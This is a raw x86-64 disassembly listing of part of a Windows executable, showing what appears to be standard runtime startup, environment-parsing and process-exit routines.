   140004f43:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004f47:	41 56                	push   %r14
   140004f49:	48 83 ec 30          	sub    $0x30,%rsp
   140004f4d:	48 8b f1             	mov    %rcx,%rsi
   140004f50:	33 c9                	xor    %ecx,%ecx
   140004f52:	4c 8b c6             	mov    %rsi,%r8
   140004f55:	8a 16                	mov    (%rsi),%dl
   140004f57:	eb 25                	jmp    0x140004f7e
   140004f59:	80 fa 3d             	cmp    $0x3d,%dl
   140004f5c:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140004f60:	48 0f 44 c1          	cmove  %rcx,%rax
   140004f64:	48 8b c8             	mov    %rax,%rcx
   140004f67:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140004f6b:	48 ff c0             	inc    %rax
   140004f6e:	41 80 3c 00 00       	cmpb   $0x0,(%r8,%rax,1)
   140004f73:	75 f6                	jne    0x140004f6b
   140004f75:	49 ff c0             	inc    %r8
   140004f78:	4c 03 c0             	add    %rax,%r8
   140004f7b:	41 8a 10             	mov    (%r8),%dl
   140004f7e:	84 d2                	test   %dl,%dl
   140004f80:	75 d7                	jne    0x140004f59
   140004f82:	48 ff c1             	inc    %rcx
   140004f85:	ba 08 00 00 00       	mov    $0x8,%edx
   140004f8a:	e8 45 1c 00 00       	call   0x140006bd4
   140004f8f:	48 8b d8             	mov    %rax,%rbx
   140004f92:	48 85 c0             	test   %rax,%rax
   140004f95:	75 0b                	jne    0x140004fa2
   140004f97:	33 c9                	xor    %ecx,%ecx
   140004f99:	e8 ae 1c 00 00       	call   0x140006c4c
   140004f9e:	33 c0                	xor    %eax,%eax
   140004fa0:	eb 72                	jmp    0x140005014
   140004fa2:	4c 8b f3             	mov    %rbx,%r14
   140004fa5:	8a 06                	mov    (%rsi),%al
   140004fa7:	84 c0                	test   %al,%al
   140004fa9:	74 5f                	je     0x14000500a
   140004fab:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140004faf:	48 ff c5             	inc    %rbp
   140004fb2:	80 3c 2e 00          	cmpb   $0x0,(%rsi,%rbp,1)
   140004fb6:	75 f7                	jne    0x140004faf
   140004fb8:	48 ff c5             	inc    %rbp
   140004fbb:	3c 3d                	cmp    $0x3d,%al
   140004fbd:	74 35                	je     0x140004ff4
   140004fbf:	ba 01 00 00 00       	mov    $0x1,%edx
   140004fc4:	48 8b cd             	mov    %rbp,%rcx
   140004fc7:	e8 08 1c 00 00       	call   0x140006bd4
   140004fcc:	48 8b f8             	mov    %rax,%rdi
   140004fcf:	48 85 c0             	test   %rax,%rax
   140004fd2:	74 25                	je     0x140004ff9
   140004fd4:	4c 8b c6             	mov    %rsi,%r8
   140004fd7:	48 8b d5             	mov    %rbp,%rdx
   140004fda:	48 8b c8             	mov    %rax,%rcx
   140004fdd:	e8 ce 0d 00 00       	call   0x140005db0
   140004fe2:	33 c9                	xor    %ecx,%ecx
   140004fe4:	85 c0                	test   %eax,%eax
   140004fe6:	75 47                	jne    0x14000502f
   140004fe8:	49 89 3e             	mov    %rdi,(%r14)
   140004feb:	49 83 c6 08          	add    $0x8,%r14
   140004fef:	e8 58 1c 00 00       	call   0x140006c4c
   140004ff4:	48 03 f5             	add    %rbp,%rsi
   140004ff7:	eb ac                	jmp    0x140004fa5
   140004ff9:	48 8b cb             	mov    %rbx,%rcx
   140004ffc:	e8 43 00 00 00       	call   0x140005044
   140005001:	33 c9                	xor    %ecx,%ecx
   140005003:	e8 44 1c 00 00       	call   0x140006c4c
   140005008:	eb 8d                	jmp    0x140004f97
   14000500a:	33 c9                	xor    %ecx,%ecx
   14000500c:	e8 3b 1c 00 00       	call   0x140006c4c
   140005011:	48 8b c3             	mov    %rbx,%rax
   140005014:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005019:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000501e:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005023:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140005028:	48 83 c4 30          	add    $0x30,%rsp
   14000502c:	41 5e                	pop    %r14
   14000502e:	c3                   	ret
   14000502f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005035:	45 33 c9             	xor    %r9d,%r9d
   140005038:	45 33 c0             	xor    %r8d,%r8d
   14000503b:	33 d2                	xor    %edx,%edx
   14000503d:	e8 56 1a 00 00       	call   0x140006a98
   140005042:	cc                   	int3
   140005043:	cc                   	int3
   140005044:	48 85 c9             	test   %rcx,%rcx
   140005047:	74 3b                	je     0x140005084
   140005049:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000504e:	57                   	push   %rdi
   14000504f:	48 83 ec 20          	sub    $0x20,%rsp
   140005053:	48 8b 01             	mov    (%rcx),%rax
   140005056:	48 8b d9             	mov    %rcx,%rbx
   140005059:	48 8b f9             	mov    %rcx,%rdi
   14000505c:	eb 0f                	jmp    0x14000506d
   14000505e:	48 8b c8             	mov    %rax,%rcx
   140005061:	e8 e6 1b 00 00       	call   0x140006c4c
   140005066:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   14000506a:	48 8b 07             	mov    (%rdi),%rax
   14000506d:	48 85 c0             	test   %rax,%rax
   140005070:	75 ec                	jne    0x14000505e
   140005072:	48 8b cb             	mov    %rbx,%rcx
   140005075:	e8 d2 1b 00 00       	call   0x140006c4c
   14000507a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000507f:	48 83 c4 20          	add    $0x20,%rsp
   140005083:	5f                   	pop    %rdi
   140005084:	c3                   	ret
   140005085:	cc                   	int3
   140005086:	cc                   	int3
   140005087:	cc                   	int3
   140005088:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000508d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005092:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140005097:	41 56                	push   %r14
   140005099:	48 83 ec 40          	sub    $0x40,%rsp
   14000509d:	48 8b 3d 7c 62 01 00 	mov    0x1627c(%rip),%rdi        # 0x14001b320
   1400050a4:	41 83 ce ff          	or     $0xffffffff,%r14d
   1400050a8:	48 85 ff             	test   %rdi,%rdi
   1400050ab:	0f 85 98 00 00 00    	jne    0x140005149
   1400050b1:	41 8b c6             	mov    %r14d,%eax
   1400050b4:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400050b9:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400050be:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400050c3:	48 83 c4 40          	add    $0x40,%rsp
   1400050c7:	41 5e                	pop    %r14
   1400050c9:	c3                   	ret
   1400050ca:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400050d0:	45 8b ce             	mov    %r14d,%r9d
   1400050d3:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400050d9:	4c 8b c0             	mov    %rax,%r8
   1400050dc:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400050e1:	33 d2                	xor    %edx,%edx
   1400050e3:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400050e9:	33 c9                	xor    %ecx,%ecx
   1400050eb:	e8 fc 34 00 00       	call   0x1400085ec
   1400050f0:	48 63 f0             	movslq %eax,%rsi
   1400050f3:	85 c0                	test   %eax,%eax
   1400050f5:	74 ba                	je     0x1400050b1
   1400050f7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400050fc:	48 8b ce             	mov    %rsi,%rcx
   1400050ff:	e8 d0 1a 00 00       	call   0x140006bd4
   140005104:	48 8b d8             	mov    %rax,%rbx
   140005107:	48 85 c0             	test   %rax,%rax
   14000510a:	74 4e                	je     0x14000515a
   14000510c:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140005112:	45 8b ce             	mov    %r14d,%r9d
   140005115:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000511b:	33 d2                	xor    %edx,%edx
   14000511d:	4c 8b 07             	mov    (%rdi),%r8
   140005120:	33 c9                	xor    %ecx,%ecx
   140005122:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140005126:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000512b:	e8 bc 34 00 00       	call   0x1400085ec
   140005130:	48 8b cb             	mov    %rbx,%rcx
   140005133:	85 c0                	test   %eax,%eax
   140005135:	74 25                	je     0x14000515c
   140005137:	33 d2                	xor    %edx,%edx
   140005139:	e8 de 3a 00 00       	call   0x140008c1c
   14000513e:	33 c9                	xor    %ecx,%ecx
   140005140:	e8 07 1b 00 00       	call   0x140006c4c
   140005145:	48 83 c7 08          	add    $0x8,%rdi
   140005149:	48 8b 07             	mov    (%rdi),%rax
   14000514c:	48 85 c0             	test   %rax,%rax
   14000514f:	0f 85 75 ff ff ff    	jne    0x1400050ca
   140005155:	e9 5a ff ff ff       	jmp    0x1400050b4
   14000515a:	33 c9                	xor    %ecx,%ecx
   14000515c:	e8 eb 1a 00 00       	call   0x140006c4c
   140005161:	e9 4b ff ff ff       	jmp    0x1400050b1
   140005166:	cc                   	int3
   140005167:	cc                   	int3
   140005168:	48 83 ec 28          	sub    $0x28,%rsp
   14000516c:	48 8b 09             	mov    (%rcx),%rcx
   14000516f:	48 3b 0d ba 61 01 00 	cmp    0x161ba(%rip),%rcx        # 0x14001b330
   140005176:	74 05                	je     0x14000517d
   140005178:	e8 c7 fe ff ff       	call   0x140005044
   14000517d:	48 83 c4 28          	add    $0x28,%rsp
   140005181:	c3                   	ret
   140005182:	cc                   	int3
   140005183:	cc                   	int3
   140005184:	48 83 ec 28          	sub    $0x28,%rsp
   140005188:	48 8b 09             	mov    (%rcx),%rcx
   14000518b:	48 3b 0d 96 61 01 00 	cmp    0x16196(%rip),%rcx        # 0x14001b328
   140005192:	74 05                	je     0x140005199
   140005194:	e8 ab fe ff ff       	call   0x140005044
   140005199:	48 83 c4 28          	add    $0x28,%rsp
   14000519d:	c3                   	ret
   14000519e:	cc                   	int3
   14000519f:	cc                   	int3
   1400051a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400051a4:	48 8b 05 6d 61 01 00 	mov    0x1616d(%rip),%rax        # 0x14001b318
   1400051ab:	48 85 c0             	test   %rax,%rax
   1400051ae:	75 26                	jne    0x1400051d6
   1400051b0:	48 39 05 69 61 01 00 	cmp    %rax,0x16169(%rip)        # 0x14001b320
   1400051b7:	75 04                	jne    0x1400051bd
   1400051b9:	33 c0                	xor    %eax,%eax
   1400051bb:	eb 19                	jmp    0x1400051d6
   1400051bd:	e8 fe fc ff ff       	call   0x140004ec0
   1400051c2:	85 c0                	test   %eax,%eax
   1400051c4:	74 09                	je     0x1400051cf
   1400051c6:	e8 bd fe ff ff       	call   0x140005088
   1400051cb:	85 c0                	test   %eax,%eax
   1400051cd:	75 ea                	jne    0x1400051b9
   1400051cf:	48 8b 05 42 61 01 00 	mov    0x16142(%rip),%rax        # 0x14001b318
   1400051d6:	48 83 c4 28          	add    $0x28,%rsp
   1400051da:	c3                   	ret
   1400051db:	cc                   	int3
   1400051dc:	48 83 ec 38          	sub    $0x38,%rsp
   1400051e0:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   1400051e7:	ff ff 
   1400051e9:	48 8d 0d 28 61 01 00 	lea    0x16128(%rip),%rcx        # 0x14001b318
   1400051f0:	e8 73 ff ff ff       	call   0x140005168
   1400051f5:	90                   	nop
   1400051f6:	48 8d 0d 23 61 01 00 	lea    0x16123(%rip),%rcx        # 0x14001b320
   1400051fd:	e8 82 ff ff ff       	call   0x140005184
   140005202:	90                   	nop
   140005203:	48 8b 0d 26 61 01 00 	mov    0x16126(%rip),%rcx        # 0x14001b330
   14000520a:	e8 35 fe ff ff       	call   0x140005044
   14000520f:	48 8b 0d 12 61 01 00 	mov    0x16112(%rip),%rcx        # 0x14001b328
   140005216:	48 83 c4 38          	add    $0x38,%rsp
   14000521a:	e9 25 fe ff ff       	jmp    0x140005044
   14000521f:	cc                   	int3
   140005220:	48 83 ec 28          	sub    $0x28,%rsp
   140005224:	48 8b 05 05 61 01 00 	mov    0x16105(%rip),%rax        # 0x14001b330
   14000522b:	48 85 c0             	test   %rax,%rax
   14000522e:	75 39                	jne    0x140005269
   140005230:	48 8b 05 e1 60 01 00 	mov    0x160e1(%rip),%rax        # 0x14001b318
   140005237:	48 85 c0             	test   %rax,%rax
   14000523a:	75 26                	jne    0x140005262
   14000523c:	48 39 05 dd 60 01 00 	cmp    %rax,0x160dd(%rip)        # 0x14001b320
   140005243:	75 04                	jne    0x140005249
   140005245:	33 c0                	xor    %eax,%eax
   140005247:	eb 19                	jmp    0x140005262
   140005249:	e8 72 fc ff ff       	call   0x140004ec0
   14000524e:	85 c0                	test   %eax,%eax
   140005250:	74 09                	je     0x14000525b
   140005252:	e8 31 fe ff ff       	call   0x140005088
   140005257:	85 c0                	test   %eax,%eax
   140005259:	75 ea                	jne    0x140005245
   14000525b:	48 8b 05 b6 60 01 00 	mov    0x160b6(%rip),%rax        # 0x14001b318
   140005262:	48 89 05 c7 60 01 00 	mov    %rax,0x160c7(%rip)        # 0x14001b330
   140005269:	48 83 c4 28          	add    $0x28,%rsp
   14000526d:	c3                   	ret
   14000526e:	cc                   	int3
   14000526f:	cc                   	int3
   140005270:	e9 4b fc ff ff       	jmp    0x140004ec0
   140005275:	cc                   	int3
   140005276:	cc                   	int3
   140005277:	cc                   	int3
   140005278:	48 3b ca             	cmp    %rdx,%rcx
   14000527b:	74 3b                	je     0x1400052b8
   14000527d:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005282:	57                   	push   %rdi
   140005283:	48 83 ec 20          	sub    $0x20,%rsp
   140005287:	48 8b fa             	mov    %rdx,%rdi
   14000528a:	48 8b d9             	mov    %rcx,%rbx
   14000528d:	48 8b 03             	mov    (%rbx),%rax
   140005290:	48 85 c0             	test   %rax,%rax
   140005293:	74 10                	je     0x1400052a5
   140005295:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   14000529c:	3e f1 85 
   14000529f:	ff 15 1b b0 00 00    	call   *0xb01b(%rip)        # 0x1400102c0
   1400052a5:	48 83 c3 08          	add    $0x8,%rbx
   1400052a9:	48 3b df             	cmp    %rdi,%rbx
   1400052ac:	75 df                	jne    0x14000528d
   1400052ae:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400052b3:	48 83 c4 20          	add    $0x20,%rsp
   1400052b7:	5f                   	pop    %rdi
   1400052b8:	c3                   	ret
   1400052b9:	cc                   	int3
   1400052ba:	cc                   	int3
   1400052bb:	cc                   	int3
   1400052bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400052c1:	57                   	push   %rdi
   1400052c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400052c6:	48 8b fa             	mov    %rdx,%rdi
   1400052c9:	48 8b d9             	mov    %rcx,%rbx
   1400052cc:	48 3b ca             	cmp    %rdx,%rcx
   1400052cf:	74 25                	je     0x1400052f6
   1400052d1:	48 8b 03             	mov    (%rbx),%rax
   1400052d4:	48 85 c0             	test   %rax,%rax
   1400052d7:	74 14                	je     0x1400052ed
   1400052d9:	49 ba 70 30 52 5e 47 	movabs $0xd30527475e523070,%r10
   1400052e0:	27 05 d3 
   1400052e3:	ff 15 d7 af 00 00    	call   *0xafd7(%rip)        # 0x1400102c0
   1400052e9:	85 c0                	test   %eax,%eax
   1400052eb:	75 0b                	jne    0x1400052f8
   1400052ed:	48 83 c3 08          	add    $0x8,%rbx
   1400052f1:	48 3b df             	cmp    %rdi,%rbx
   1400052f4:	eb d9                	jmp    0x1400052cf
   1400052f6:	33 c0                	xor    %eax,%eax
   1400052f8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400052fd:	48 83 c4 20          	add    $0x20,%rsp
   140005301:	5f                   	pop    %rdi
   140005302:	c3                   	ret
   140005303:	cc                   	int3
   140005304:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005309:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000530e:	57                   	push   %rdi
   14000530f:	48 83 ec 20          	sub    $0x20,%rsp
   140005313:	49 8b d9             	mov    %r9,%rbx
   140005316:	49 8b f8             	mov    %r8,%rdi
   140005319:	8b 0a                	mov    (%rdx),%ecx
   14000531b:	e8 4c 39 00 00       	call   0x140008c6c
   140005320:	90                   	nop
   140005321:	48 8b cf             	mov    %rdi,%rcx
   140005324:	e8 13 00 00 00       	call   0x14000533c
   140005329:	90                   	nop
   14000532a:	8b 0b                	mov    (%rbx),%ecx
   14000532c:	e8 8f 39 00 00       	call   0x140008cc0
   140005331:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005336:	48 83 c4 20          	add    $0x20,%rsp
   14000533a:	5f                   	pop    %rdi
   14000533b:	c3                   	ret
   14000533c:	40 53                	rex push %rbx
   14000533e:	48 83 ec 30          	sub    $0x30,%rsp
   140005342:	48 8b d9             	mov    %rcx,%rbx
   140005345:	80 3d fc 5f 01 00 00 	cmpb   $0x0,0x15ffc(%rip)        # 0x14001b348
   14000534c:	0f 85 a9 00 00 00    	jne    0x1400053fb
   140005352:	b8 01 00 00 00       	mov    $0x1,%eax
   140005357:	87 05 db 5f 01 00    	xchg   %eax,0x15fdb(%rip)        # 0x14001b338
   14000535d:	48 8b 01             	mov    (%rcx),%rax
   140005360:	8b 08                	mov    (%rax),%ecx
   140005362:	85 c9                	test   %ecx,%ecx
   140005364:	75 3e                	jne    0x1400053a4
   140005366:	48 8b 05 93 4c 01 00 	mov    0x14c93(%rip),%rax        # 0x14001a000
   14000536d:	48 8b 15 cc 5f 01 00 	mov    0x15fcc(%rip),%rdx        # 0x14001b340
   140005374:	48 3b d0             	cmp    %rax,%rdx
   140005377:	74 22                	je     0x14000539b
   140005379:	8b c8                	mov    %eax,%ecx
   14000537b:	83 e1 3f             	and    $0x3f,%ecx
   14000537e:	48 33 c2             	xor    %rdx,%rax
   140005381:	48 d3 c8             	ror    %cl,%rax
   140005384:	49 ba 70 28 d9 78 45 	movabs $0x99012e4578d92870,%r10
   14000538b:	2e 01 99 
   14000538e:	45 33 c0             	xor    %r8d,%r8d
   140005391:	33 d2                	xor    %edx,%edx
   140005393:	33 c9                	xor    %ecx,%ecx
   140005395:	ff 15 25 af 00 00    	call   *0xaf25(%rip)        # 0x1400102c0
   14000539b:	48 8d 0d ee 5f 01 00 	lea    0x15fee(%rip),%rcx        # 0x14001b390
   1400053a2:	eb 0c                	jmp    0x1400053b0
   1400053a4:	83 f9 01             	cmp    $0x1,%ecx
   1400053a7:	75 0d                	jne    0x1400053b6
   1400053a9:	48 8d 0d f8 5f 01 00 	lea    0x15ff8(%rip),%rcx        # 0x14001b3a8
   1400053b0:	e8 87 07 00 00       	call   0x140005b3c
   1400053b5:	90                   	nop
   1400053b6:	48 8b 03             	mov    (%rbx),%rax
   1400053b9:	83 38 00             	cmpl   $0x0,(%rax)
   1400053bc:	75 13                	jne    0x1400053d1
   1400053be:	48 8d 15 93 af 00 00 	lea    0xaf93(%rip),%rdx        # 0x140010358
   1400053c5:	48 8d 0d 6c af 00 00 	lea    0xaf6c(%rip),%rcx        # 0x140010338
   1400053cc:	e8 a7 fe ff ff       	call   0x140005278
   1400053d1:	48 8d 15 90 af 00 00 	lea    0xaf90(%rip),%rdx        # 0x140010368
   1400053d8:	48 8d 0d 81 af 00 00 	lea    0xaf81(%rip),%rcx        # 0x140010360
   1400053df:	e8 94 fe ff ff       	call   0x140005278
   1400053e4:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400053e8:	83 38 00             	cmpl   $0x0,(%rax)
   1400053eb:	75 0e                	jne    0x1400053fb
   1400053ed:	c6 05 54 5f 01 00 01 	movb   $0x1,0x15f54(%rip)        # 0x14001b348
   1400053f4:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400053f8:	c6 00 01             	movb   $0x1,(%rax)
   1400053fb:	48 83 c4 30          	add    $0x30,%rsp
   1400053ff:	5b                   	pop    %rbx
   140005400:	c3                   	ret
   140005401:	e8 62 09 00 00       	call   0x140005d68
   140005406:	90                   	nop
   140005407:	cc                   	int3
   140005408:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000540d:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140005411:	55                   	push   %rbp
   140005412:	48 8b ec             	mov    %rsp,%rbp
   140005415:	48 83 ec 50          	sub    $0x50,%rsp
   140005419:	48 c7 45 e0 fe ff ff 	movq   $0xfffffffffffffffe,-0x20(%rbp)
   140005420:	ff 
   140005421:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140005426:	8b d9                	mov    %ecx,%ebx
   140005428:	45 85 c0             	test   %r8d,%r8d
   14000542b:	75 4a                	jne    0x140005477
   14000542d:	33 c9                	xor    %ecx,%ecx
   14000542f:	ff 15 93 ac 00 00    	call   *0xac93(%rip)        # 0x1400100c8
   140005435:	48 85 c0             	test   %rax,%rax
   140005438:	74 3d                	je     0x140005477
   14000543a:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000543f:	66 39 08             	cmp    %cx,(%rax)
   140005442:	75 33                	jne    0x140005477
   140005444:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140005448:	48 03 c8             	add    %rax,%rcx
   14000544b:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140005451:	75 24                	jne    0x140005477
   140005453:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140005458:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   14000545c:	75 19                	jne    0x140005477
   14000545e:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140005465:	76 10                	jbe    0x140005477
   140005467:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   14000546e:	74 07                	je     0x140005477
   140005470:	8b cb                	mov    %ebx,%ecx
   140005472:	e8 b1 00 00 00       	call   0x140005528
   140005477:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   14000547b:	48 8d 45 18          	lea    0x18(%rbp),%rax
   14000547f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140005483:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140005487:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000548b:	48 8d 45 28          	lea    0x28(%rbp),%rax
   14000548f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005493:	b8 02 00 00 00       	mov    $0x2,%eax
   140005498:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000549b:	89 45 d8             	mov    %eax,-0x28(%rbp)
   14000549e:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   1400054a2:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   1400054a6:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400054aa:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400054ae:	e8 51 fe ff ff       	call   0x140005304
   1400054b3:	90                   	nop
   1400054b4:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   1400054b8:	74 0b                	je     0x1400054c5
   1400054ba:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400054bf:	48 83 c4 50          	add    $0x50,%rsp
   1400054c3:	5d                   	pop    %rbp
   1400054c4:	c3                   	ret
   1400054c5:	8b cb                	mov    %ebx,%ecx
   1400054c7:	e8 04 00 00 00       	call   0x1400054d0
   1400054cc:	cc                   	int3
   1400054cd:	cc                   	int3
   1400054ce:	cc                   	int3
   1400054cf:	cc                   	int3
   1400054d0:	40 53                	rex push %rbx
   1400054d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400054d6:	8b d9                	mov    %ecx,%ebx
   1400054d8:	e8 27 00 00 00       	call   0x140005504
   1400054dd:	84 c0                	test   %al,%al
   1400054df:	74 11                	je     0x1400054f2
   1400054e1:	ff 15 91 ab 00 00    	call   *0xab91(%rip)        # 0x140010078
   1400054e7:	48 8b c8             	mov    %rax,%rcx
   1400054ea:	8b d3                	mov    %ebx,%edx
   1400054ec:	ff 15 8e ab 00 00    	call   *0xab8e(%rip)        # 0x140010080
   1400054f2:	8b cb                	mov    %ebx,%ecx
   1400054f4:	e8 2f 00 00 00       	call   0x140005528
   1400054f9:	8b cb                	mov    %ebx,%ecx
   1400054fb:	ff 15 6f ac 00 00    	call   *0xac6f(%rip)        # 0x140010170
   140005501:	cc                   	int3
   140005502:	cc                   	int3
   140005503:	cc                   	int3
   140005504:	48 83 ec 28          	sub    $0x28,%rsp
   140005508:	e8 03 38 00 00       	call   0x140008d10
   14000550d:	83 f8 01             	cmp    $0x1,%eax
   140005510:	74 0c                	je     0x14000551e
   140005512:	e8 c5 37 00 00       	call   0x140008cdc
   140005517:	84 c0                	test   %al,%al
   140005519:	0f 94 c0             	sete   %al
   14000551c:	eb 02                	jmp    0x140005520
   14000551e:	32 c0                	xor    %al,%al
   140005520:	48 83 c4 28          	add    $0x28,%rsp
   140005524:	c3                   	ret
   140005525:	cc                   	int3
   140005526:	cc                   	int3
   140005527:	cc                   	int3
   140005528:	40 53                	rex push %rbx
   14000552a:	48 83 ec 30          	sub    $0x30,%rsp
   14000552e:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140005535:	ff ff 
   140005537:	8b d9                	mov    %ecx,%ebx
   140005539:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   14000553f:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140005544:	48 8d 15 b5 bf 00 00 	lea    0xbfb5(%rip),%rdx        # 0x140011500
   14000554b:	33 c9                	xor    %ecx,%ecx
   14000554d:	ff 15 25 ac 00 00    	call   *0xac25(%rip)        # 0x140010178
   140005553:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140005558:	85 c0                	test   %eax,%eax
   14000555a:	74 29                	je     0x140005585
   14000555c:	48 8d 15 b5 bf 00 00 	lea    0xbfb5(%rip),%rdx        # 0x140011518
   140005563:	ff 15 c7 ab 00 00    	call   *0xabc7(%rip)        # 0x140010130
   140005569:	48 85 c0             	test   %rax,%rax
   14000556c:	74 12                	je     0x140005580
   14000556e:	49 ba 70 7b 5a 5e 9b 	movabs $0xa201879b5e5a7b70,%r10
   140005575:	87 01 a2 
   140005578:	8b cb                	mov    %ebx,%ecx
   14000557a:	ff 15 40 ad 00 00    	call   *0xad40(%rip)        # 0x1400102c0
   140005580:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140005585:	48 85 c9             	test   %rcx,%rcx
   140005588:	74 07                	je     0x140005591
   14000558a:	ff 15 98 ab 00 00    	call   *0xab98(%rip)        # 0x140010128
   140005590:	90                   	nop
   140005591:	48 83 c4 30          	add    $0x30,%rsp
   140005595:	5b                   	pop    %rbx
   140005596:	c3                   	ret
   140005597:	cc                   	int3
   140005598:	48 89 0d a1 5d 01 00 	mov    %rcx,0x15da1(%rip)        # 0x14001b340
   14000559f:	c3                   	ret
   1400055a0:	ba 02 00 00 00       	mov    $0x2,%edx
   1400055a5:	33 c9                	xor    %ecx,%ecx
   1400055a7:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   1400055ab:	e9 58 fe ff ff       	jmp    0x140005408
   1400055b0:	33 d2                	xor    %edx,%edx
   1400055b2:	33 c9                	xor    %ecx,%ecx
   1400055b4:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   1400055b8:	e9 4b fe ff ff       	jmp    0x140005408
   1400055bd:	cc                   	int3
   1400055be:	cc                   	int3
   1400055bf:	cc                   	int3
   1400055c0:	45 33 c0             	xor    %r8d,%r8d
   1400055c3:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400055c7:	e9 3c fe ff ff       	jmp    0x140005408
   1400055cc:	48 83 ec 28          	sub    $0x28,%rsp
   1400055d0:	4c 8b 05 29 4a 01 00 	mov    0x14a29(%rip),%r8        # 0x14001a000
   1400055d7:	48 8b d1             	mov    %rcx,%rdx
   1400055da:	4c 39 05 5f 5d 01 00 	cmp    %r8,0x15d5f(%rip)        # 0x14001b340
   1400055e1:	75 21                	jne    0x140005604
   1400055e3:	41 8b c8             	mov    %r8d,%ecx
   1400055e6:	b8 40 00 00 00       	mov    $0x40,%eax
   1400055eb:	83 e1 3f             	and    $0x3f,%ecx
   1400055ee:	2b c1                	sub    %ecx,%eax
   1400055f0:	8a c8                	mov    %al,%cl
   1400055f2:	48 d3 ca             	ror    %cl,%rdx
   1400055f5:	49 33 d0             	xor    %r8,%rdx
   1400055f8:	48 89 15 41 5d 01 00 	mov    %rdx,0x15d41(%rip)        # 0x14001b340
   1400055ff:	48 83 c4 28          	add    $0x28,%rsp
   140005603:	c3                   	ret
   140005604:	e8 5f 07 00 00       	call   0x140005d68
   140005609:	cc                   	int3
   14000560a:	cc                   	int3
   14000560b:	cc                   	int3
   14000560c:	45 33 c0             	xor    %r8d,%r8d
   14000560f:	33 d2                	xor    %edx,%edx
   140005611:	e9 f2 fd ff ff       	jmp    0x140005408
   140005616:	cc                   	int3
   140005617:	cc                   	int3
   140005618:	48 83 ec 28          	sub    $0x28,%rsp
   14000561c:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   140005622:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   140005627:	75 12                	jne    0x14000563b
   140005629:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   14000562f:	74 0a                	je     0x14000563b
   140005631:	87 0d ed 5f 01 00    	xchg   %ecx,0x15fed(%rip)        # 0x14001b624
   140005637:	33 c0                	xor    %eax,%eax
   140005639:	eb 15                	jmp    0x140005650
   14000563b:	e8 74 15 00 00       	call   0x140006bb4
